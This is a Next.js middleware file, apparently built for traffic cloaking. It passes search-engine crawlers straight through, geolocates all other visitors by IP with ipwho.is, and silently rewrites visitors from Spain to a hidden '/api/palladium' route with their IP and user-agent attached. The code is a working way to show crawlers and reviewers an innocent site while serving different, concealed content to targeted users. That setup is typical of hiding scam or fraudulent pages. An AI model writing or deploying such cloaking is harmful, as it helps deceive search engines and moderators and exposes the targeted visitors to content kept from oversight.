import { NextRequest, NextResponse } from 'next/server'

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua)
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || ''
    const ipHeader =
        req.headers.get('x-forwarded-for') ||
        req.headers.get('x-real-ip') ||
        req.headers.get('cf-connecting-ip') ||
        '8.8.8.8'
    const ip = ipHeader.split(',')[0].trim()

    // 🟢 Ботам нічого не чіпаємо — пропускаємо далі
    if (isBot(ua)) {
        return NextResponse.next()
    }

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`)
        const geo = await geoRes.json()

        const isSpain = geo.success && geo.country_code === 'ES'

        // 🔥 Тільки користувачі з Іспанії → Palladium
        if (isSpain) {
            const url = req.nextUrl.clone()
            url.pathname = '/api/palladium'
            url.searchParams.set('ip', ip)
            url.searchParams.set('ua', ua)
            return NextResponse.rewrite(url)
        }

        // 🟢 Усі інші — рендеримо як є
        return NextResponse.next()
    } catch (err) {
        console.error('[Middleware Error]', err)
        return NextResponse.next()
    }
}

export const config = {
    matcher: ['/', '/page', '/((?!_next|api|static|favicon.ico).*)'],
}
